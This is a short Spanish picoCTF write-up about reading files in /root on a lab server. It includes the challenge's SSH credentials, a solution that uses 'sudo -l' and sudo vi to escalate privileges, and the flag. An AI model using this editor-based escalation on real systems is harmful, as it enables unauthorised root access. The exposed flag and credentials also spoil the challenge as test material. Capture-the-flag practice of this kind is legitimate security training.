# Reto
# Descripcion
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62077 picoplayer@saturn.picoctf.net`Password: `33qE7mB5BF`Can you login and read the root file?
# Solucion

```
affogato1-picoctf@webshell:~$ ls /root
ls: cannot open directory '/root': Permission denied

affogato1-picoctf@webshell:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

affogato1-picoctf@webshell:~$ sudo vi root
```
### Flag: picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
# Notas
Utilice vim para navegar dentro del directorio de root y encontrar la bandera
# Referencias
